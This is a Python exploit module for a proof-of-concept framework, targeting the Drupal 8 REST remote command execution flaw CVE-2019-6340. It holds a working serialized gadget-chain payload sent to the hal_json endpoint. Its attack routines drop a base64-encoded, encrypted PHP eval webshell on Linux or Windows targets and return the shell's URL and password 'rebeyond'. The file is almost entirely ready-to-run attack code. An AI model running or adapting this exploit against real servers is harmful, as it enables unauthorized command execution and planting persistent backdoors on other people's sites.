import re
from collections import OrderedDict

from libs.pocstrike.api \
    import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE, get_listener_ip, get_listener_port, random_str
from libs.pocstrike.lib.core.interpreter_option \
    import OptString, OptDict, OptIP, OptPort, OptBool, OptInteger, OptFloat, OptItems
from libs.pocstrike.modules.listener import REVERSE_PAYLOAD


class DemoPOC(POCBase):
    vulID = '4'
    version = '1'
    author = 'test'
    vulDate = '2021-04-12'
    createDate = '2021-04-12'
    updateDate = '2021-04-12'
    references = ['http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-6340']
    name = 'Drupal remote command execute'
    appPowerLink = 'https://www.drupal.org/'
    appName = 'Drupal'
    appVersion = 'Drupal 8.5.x before 8.5.11 and Drupal 8.6.x before 8.6.10'
    vulType = VUL_TYPE.REMOTE_COMMAND_EXECUTE
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = []
    install_requires = []
    desc = '''
            Some field types do not properly sanitize data from non-form sources in Drupal 8.5.x before 8.5.11 and Drupal 8.6.x before 8.6.10.
        '''
    pocDesc = '''
            Incoming destination site
        '''

    def _options(self):
        opt = OrderedDict()
        return opt

    def _verify(self):
        output = Output(self)
        result = {}
        if self.url[-1] == '/':
            self.url = self.url[:-1]
        vulkey = self.detect_drupal(self.url)
        if vulkey:
            result = {
                'Result': {
                    'target': '{0} has vulnerability'.format(self.url),
                    'vulkey': vulkey,
                }
            }
        return self.parse_output(output, result)

    def _attack(self):
        output = Output(self)
        result = {}
        if self.url[-1] == '/':
            self.url = self.url[:-1]
        shell_name = self.pwn_drupal_windows(self.url)
        if shell_name:
            result = {
                'Result': {
                    'target': self.url,
                    'webshell': self.url + '/' + shell_name,
                    'pass': 'rebeyond'
                }
            }
        else:
            shell_name = self.pwn_drupal_linux(self.url)
            if shell_name:
                result = {
                    'Result': {
                        'target': self.url,
                        'webshell': self.url + '/' + shell_name,
                        'pass': 'rebeyond'
                    }
                }

        return self.parse_output(output, result)

    def _shell(self):
        pass

    def parse_output(self, output, result):
        if result:
            output.success(result)
        else:
            output.fail()
        return output

    def detect_drupal(self, url):
        vulkey = random_str()
        cmd = "echo " + vulkey
        dir = "/node/?_format=hal_json"
        url_dir = url + dir
        cmd_len = len(cmd)
        payload = "{\r\n  \"link\": [\r\n    {\r\n      \"value\": \"link\",\r\n      \"options\": \"O:24:\\\"GuzzleHttp\\\\Psr7\\\\FnStream\\\":2:{s:33:\\\"\\u0000GuzzleHttp\\\\Psr7\\\\FnStream\\u0000methods\\\";a:1:{s:5:\\\"close\\\";a:2:{i:0;O:23:\\\"GuzzleHttp\\\\HandlerStack\\\":3:{s:32:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000handler\\\";s:%s:\\\"%s\\\";s:30:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000stack\\\";a:1:{i:0;a:1:{i:0;s:6:\\\"system\\\";}}s:31:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000cached\\\";b:0;}i:1;s:7:\\\"resolve\\\";}}s:9:\\\"_fn_close\\\";a:2:{i:0;r:4;i:1;s:7:\\\"resolve\\\";}}\"\r\n    }\r\n  ],\r\n  \"_links\": {\r\n    \"type\": {\r\n      \"href\": \"%s/rest/type/shortcut/default\"\r\n    }\r\n  }\r\n}" % (
            cmd_len, cmd, url)
        headers = {
            'User-Agent':
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
            'Connection': "close",
            'Content-Type': "application/hal+json",
            'Accept': "*/*",
            'Cache-Control': "no-cache"
        }
        response = requests.request("POST", url_dir, data=payload, headers=headers)
        if response.status_code == 403 and "u0027access" in response.text and vulkey in response.text:
            return vulkey
        else:
            return None

    def pwn_drupal_linux(self, url):
        shell_name = random_str() + ".php"
        command_linux = 'echo PD9waHAgQGVycm9yX3JlcG9ydGluZyggMCApO3Nlc3Npb25fc3RhcnQoKTska2V5PSJlNDVlMzI5ZmViNWQ5MjViIjskX1NFU1NJT05bJ2snXT0ka2V5O3Nlc3Npb25fd3JpdGVfY2xvc2UoKTskcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTtpZighZXh0ZW5zaW9uX2xvYWRlZCgnb3BlbnNzbCcpKXskdD0iYmFzZTY0XyIuImRlY29kZSI7JHBvc3Q9JHQoJHBvc3QuIiIpO2ZvcigkaT0gMCA7JGk8c3RybGVuKCRwb3N0KTskaSsrKXskcG9zdFskaV09JHBvc3RbJGldXiRrZXlbJGkrIDEgJiAxNSBdO319ZWxzZXskcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsIkFFUzEyOCIsJGtleSk7fSRhcnI9ZXhwbG9kZSgnfCcsJHBvc3QpOyRmdW5jPSRhcnJbIDAgXTskcGFyYW1zPSRhcnJbIDEgXTtjbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2ludm9rZSgkcCl7ZXZhbCgkcC4iIik7fX1AY2FsbF91c2VyX2Z1bmMobmV3IEMoKSwkcGFyYW1zKTs/Pg== | base64 -d >' + shell_name
        dir = "/node/?_format=hal_json"
        url_dir = url + dir
        cmd_len = len(command_linux)
        payload = "{\r\n  \"link\": [\r\n    {\r\n      \"value\": \"link\",\r\n      \"options\": \"O:24:\\\"GuzzleHttp\\\\Psr7\\\\FnStream\\\":2:{s:33:\\\"\\u0000GuzzleHttp\\\\Psr7\\\\FnStream\\u0000methods\\\";a:1:{s:5:\\\"close\\\";a:2:{i:0;O:23:\\\"GuzzleHttp\\\\HandlerStack\\\":3:{s:32:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000handler\\\";s:%s:\\\"%s\\\";s:30:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000stack\\\";a:1:{i:0;a:1:{i:0;s:6:\\\"system\\\";}}s:31:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000cached\\\";b:0;}i:1;s:7:\\\"resolve\\\";}}s:9:\\\"_fn_close\\\";a:2:{i:0;r:4;i:1;s:7:\\\"resolve\\\";}}\"\r\n    }\r\n  ],\r\n  \"_links\": {\r\n    \"type\": {\r\n      \"href\": \"%s/rest/type/shortcut/default\"\r\n    }\r\n  }\r\n}" % (
            cmd_len, command_linux, url)
        headers = {
            'User-Agent':
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
            'Connection': "close",
            'Content-Type': "application/hal+json",
            'Accept': "*/*",
            'Cache-Control': "no-cache"
        }
        response = requests.request("POST", url_dir, data=payload, headers=headers)
        r = requests.get(url + '/' + shell_name)
        if r.status_code == 200:
            return shell_name
        else:
            return None

    def pwn_drupal_windows(self, url):
        shell_name = random_str() + ".php"
        command_windows = 'powershell.exe -command "[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(\'PAA/AHAAaABwACAAQABlAHIAcgBvAHIAXwByAGUAcABvAHIAdABpAG4AZwAoACAAMAAgACkAOwBzAGUAcwBzAGkAbwBuAF8AcwB0AGEAcgB0ACgAKQA7ACQAawBlAHkAPQAiAGUANAA1AGUAMwAyADkAZgBlAGIANQBkADkAMgA1AGIAIgA7ACQAXwBTAEUAUwBTAEkATwBOAFsAJwBrACcAXQA9ACQAawBlAHkAOwBzAGUAcwBzAGkAbwBuAF8AdwByAGkAdABlAF8AYwBsAG8AcwBlACgAKQA7ACQAcABvAHMAdAA9AGYAaQBsAGUAXwBnAGUAdABfAGMAbwBuAHQAZQBuAHQAcwAoACIAcABoAHAAOgAvAC8AaQBuAHAAdQB0ACIAKQA7AGkAZgAoACEAZQB4AHQAZQBuAHMAaQBvAG4AXwBsAG8AYQBkAGUAZAAoACcAbwBwAGUAbgBzAHMAbAAnACkAKQB7ACQAdAA9ACIAYgBhAHMAZQA2ADQAXwAiAC4AIgBkAGUAYwBvAGQAZQAiADsAJABwAG8AcwB0AD0AJAB0ACgAJABwAG8AcwB0AC4AIgAiACkAOwBmAG8AcgAoACQAaQA9ACAAMAAgADsAJABpADwAcwB0AHIAbABlAG4AKAAkAHAAbwBzAHQAKQA7ACQAaQArACsAKQB7ACQAcABvAHMAdABbACQAaQBdAD0AJABwAG8AcwB0AFsAJABpAF0AXgAkAGsAZQB5AFsAJABpACsAIAAxACAAJgAgADEANQAgAF0AOwB9AH0AZQBsAHMAZQB7ACQAcABvAHMAdAA9AG8AcABlAG4AcwBzAGwAXwBkAGUAYwByAHkAcAB0ACgAJABwAG8AcwB0ACwAIgBBAEUAUwAxADIAOAAiACwAJABrAGUAeQApADsAfQAkAGEAcgByAD0AZQB4AHAAbABvAGQAZQAoACcAfAAnACwAJABwAG8AcwB0ACkAOwAkAGYAdQBuAGMAPQAkAGEAcgByAFsAIAAwACAAXQA7ACQAcABhAHIAYQBtAHMAPQAkAGEAcgByAFsAIAAxACAAXQA7AGMAbABhAHMAcwAgAEMAewBwAHUAYgBsAGkAYwAgAGYAdQBuAGMAdABpAG8AbgAgAF8AXwBpAG4AdgBvAGsAZQAoACQAcAApAHsAZQB2AGEAbAAoACQAcAAuACIAIgApADsAfQB9AEAAYwBhAGwAbABfAHUAcwBlAHIAXwBmAHUAbgBjACgAbgBlAHcAIABDACgAKQAsACQAcABhAHIAYQBtAHMAKQA7AD8APgA=\')) | out-file -Encoding utf8 "' + shell_name
        dir = "/node/?_format=hal_json"
        url_dir = url + dir
        cmd_len = len(command_windows)
        payload = "{\r\n  \"link\": [\r\n    {\r\n      \"value\": \"link\",\r\n      \"options\": \"O:24:\\\"GuzzleHttp\\\\Psr7\\\\FnStream\\\":2:{s:33:\\\"\\u0000GuzzleHttp\\\\Psr7\\\\FnStream\\u0000methods\\\";a:1:{s:5:\\\"close\\\";a:2:{i:0;O:23:\\\"GuzzleHttp\\\\HandlerStack\\\":3:{s:32:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000handler\\\";s:%s:\\\"%s\\\";s:30:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000stack\\\";a:1:{i:0;a:1:{i:0;s:6:\\\"system\\\";}}s:31:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000cached\\\";b:0;}i:1;s:7:\\\"resolve\\\";}}s:9:\\\"_fn_close\\\";a:2:{i:0;r:4;i:1;s:7:\\\"resolve\\\";}}\"\r\n    }\r\n  ],\r\n  \"_links\": {\r\n    \"type\": {\r\n      \"href\": \"%s/rest/type/shortcut/default\"\r\n    }\r\n  }\r\n}" % (
            cmd_len, command_windows, url)
        headers = {
            'User-Agent':
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
            'Connection': "close",
            'Content-Type': "application/hal+json",
            'Accept': "*/*",
            'Cache-Control': "no-cache"
        }
        response = requests.request("POST", url_dir, data=payload, headers=headers)
        r = requests.get(url + '/' + shell_name)
        if r.status_code == 200:
            return shell_name
        else:
            return None


register_poc(DemoPOC)
